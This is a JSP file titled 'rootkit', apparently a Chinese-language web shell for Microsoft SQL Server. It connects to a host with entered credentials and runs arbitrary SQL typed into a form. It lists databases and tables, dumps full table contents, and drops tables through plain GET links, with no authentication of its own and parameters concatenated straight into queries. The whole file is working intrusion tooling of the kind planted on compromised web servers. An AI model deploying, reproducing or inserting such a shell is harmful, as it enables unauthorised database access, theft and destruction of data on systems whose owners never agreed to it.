<%@ page import="java.sql.*" contentType="text/html; charset=GBK"%>
<%@ page import="java.util.*"%>
<html>
<head>
<title>rootkit</title>
<script type="javascript">
var db = "master";
function getTables() {
window.open("<%=request.getRequestURL().toString()%>?action=getTables&db="+db,"","scrollbars=yes");
}

function logout() {
location.href="<%=request.getRequestURL().toString()%>?action=logout";
}

function changevalue(select) {
document.getElementById("sqlcmd").value = "use "+select.options[select.selectedIndex].value+";select * from sysobjects";
}
</script>
</head>
<body bgcolor="#ffffff">
<base href="<%=request.getRequestURL()%>" />
<%
if ((session.getAttribute("conn") == null && request.getParameter("username") == null) || request.getParameter("action") == null) {
%>
<form method="post" action="?action=getConn">
<table cellpadding="0" cellspacing="0" width="200" border="1">
<tr>
<td>
IP:
</td>
<td>
<input name="ip" type="text" id="ip">
</td>
</tr>
<tr>
<td>
USERNAME:
</td>
<td>
<input name="username" type="text" id="username">
</td>
</tr>
<tr>
<td>
PASSWORD:
</td>
<td>
<input name="password" type="password" id="password">
</td>
</tr>
<tr>
<td>
PORT:
</td>
<td>
<input name="port" type="text" id="port">
</td>
</tr>
</table>
<p>
<input name="btnok" type="submit" id="btnok" value="连接">
</p>
</form>
<%
return;
} else if (request.getParameter("action").equals("getConn")){
if (session.getAttribute("conn") != null) {
response.sendRedirect(request.getRequestURL().toString()+"?action=operator");
return;
}
String ip = request.getParameter("ip");
String username = request.getParameter("username");
String password = request.getParameter("password");
String port = request.getParameter("port");

try {
Class.forName("com.microsoft.jdbc.sqlserver.SQLServerDriver");
Connection conn = DriverManager.getConnection("jdbc:microsoft:sqlserver://"+ip+":"+port+";DatabaseName=master",username,password);
session.setAttribute("conn",conn);
response.sendRedirect(request.getRequestURL().toString()+"?action=operator");
} catch (Exception e) {
out.println(e.getMessage());
}
} else if (request.getParameter("action").equals("operator")) {
Connection conn = (Connection)session.getAttribute("conn");
if (conn != null) {
ArrayList dbs = (ArrayList)session.getAttribute("dbs");
try {
if (dbs == null) {
PreparedStatement stmt = conn.prepareStatement("select name from sysdatabases");
ResultSet rs = stmt.executeQuery();
dbs = new ArrayList();

while (rs.next()) {
dbs.add(rs.getString(1));
}
rs.close();
stmt.close();
session.setAttribute("dbs",dbs);
}
} catch (Exception e) {
out.println(e.getMessage());
}
%>
<table width="100%" cellpadding="0" cellspacing="0" border="1">
<tr>
<td width="20%">
选择数据库:
</td>
<td width="80%">

<select name="database"
onChange="db = this.options[this.selectedIndex].value;changevalue(this)"
id="database">
<%
for (int i = 0;i<dbs.size();i++) {
String str = (String)dbs.get(i);
request.setAttribute("db",str);
%><option ${db== param.db ?"selected":"" } value="<%=str%>"><%=str %></option>
<%
}
%>
</select>

< span style="cursor: pointer" onclick="getTables()">查看用户表(要查看系统表请用命令) </span>
<span onclick="logout()" style="cursor: pointer">退出</span>
</td>
</tr>
<tr>
<td>
SQL Command:
</td>
<td>
<form action="?action=operator&cmd=execute"
onsubmit="this.action += '&db='+document.getElementById('database').options[document.getElementById('database').selectedIndex].value"
method="post">
<input name="sqlcmd" type="text" id="sqlcmd"
value="${empty param.sqlcmd?" use master;select * from
sysobjects":param.sqlcmd}" size="80">
<input type="submit" name="Submit" value="执行">
</form>
</td>
</tr>
<tr>
<td valign="top">
结果:
</td>
<td>
<%
if (request.getParameter("cmd") != null) {

String sql = request.getParameter("sqlcmd");
try {
Statement stmt = conn.createStatement();
if (stmt.execute(sql)) {
ResultSet rs = stmt.getResultSet();
ResultSetMetaData data = rs.getMetaData();

int i = 1;
%>
<table bordercolor="#33CCFF" border="1" cellspacing="0"
cellpadding="0">
<tr>
<%
for (;i<=data.getColumnCount();i++) {
%>
<th><%=data.getColumnName(i) %></th>
<%
}
%>
</tr>
<%
while (rs.next()) {
out.println("<tr>");
for (i=1;i<=data.getColumnCount();i++) {
%>
<td style="word-break: break-all">
<%=rs.getString(i) %>
</td>
<%
}
out.println("</tr>");
}

%>
</table>
<%

rs.close();
stmt.close();
} else {
out.println("命令成功执行!");
}
} catch (Exception e) {
out.println(e.getMessage());
}
} else {
out.println(" ");
}
%>
</td>
</tr>

</table>
<%
}
} else if (request.getParameter("action").equals("getTables")) {
String db = request.getParameter("db");
if (db != null) {
Connection conn = (Connection)session.getAttribute("conn");
try {
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select name from ["+db+"]..sysobjects where xtype='U' and status>0");
%>
<table>
<tr>
<th>
表名
</th>
<th>
操作 查看数据
</th>
</tr>
<%
while (rs.next()) {
%>
<tr>
<td><%=rs.getString(1) %></td>
<td>
<a target="_blank"
href ="<%=request.getRequestURL().toString()+"?action=deleteTable&db="+ db+"&Table="+rs.getString(1) %>">删除</a>
</td>
<td>
<a target="_blank"
href ="<%=request.getRequestURL().toString()+"?action=getContents&db="+ db+"&table="+rs.getString(1) %>">查看</a>
</td>
</tr>
<%
}
%>
</table>
<%
rs.close();
stmt.close();
} catch (Exception e) {
out.println(e.getMessage());
}
}
} else if (request.getParameter("action").equals("logout")) {
Connection conn = (Connection)session.getAttribute("conn");
try {
conn.close();
session.invalidate();
response.sendRedirect(request.getRequestURL().toString());
} catch (Exception e) {
out.println(e.getMessage());
}
} else if (request.getParameter("action").equals("getContents")) {
String db = request.getParameter("db");
String table = request.getParameter("table");

if (db != null && table != null) {
try {
Connection conn = (Connection)session.getAttribute("conn");
if (conn != null) {
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from ["+db+"]..["+table+"]");
ResultSetMetaData data = rs.getMetaData();

out.println("<table border=1 cellpadding=0 cellspacing=0>");
int i = data.getColumnCount();
out.println("<tr>");
for (int a = 1;a<=i;a++) {
out.println("<th>"+data.getColumnName(a)+"</th>");
}
out.println("</tr>");
while (rs.next()) {
out.println("<tr>");
for (int a= 0;a<i;a++) {
out.println("<td style='word-break:break-all'>"+rs.getString(a+1)+"</td>");
}
out.println("</tr>");
}

out.println("</table>");
rs.close();
stmt.close();
}
} catch (Exception e) {
out.println(e.getMessage());
}
}
} else if (request.getParameter("action").equals("deleteTable")) {
try {
String db = request.getParameter("db");
String table = request.getParameter("Table");
Connection conn = (Connection)session.getAttribute("conn");
Statement stmt = conn.createStatement();
stmt.executeUpdate("drop table ["+db+"]..["+table+"]");
out.println(table + "表已被执行删除操作，请刷新父页面以确认表是否被删除!");
stmt.close();
} catch (Exception e) {
out.println(e.getMessage());
}

}
%>
</body>
</html> 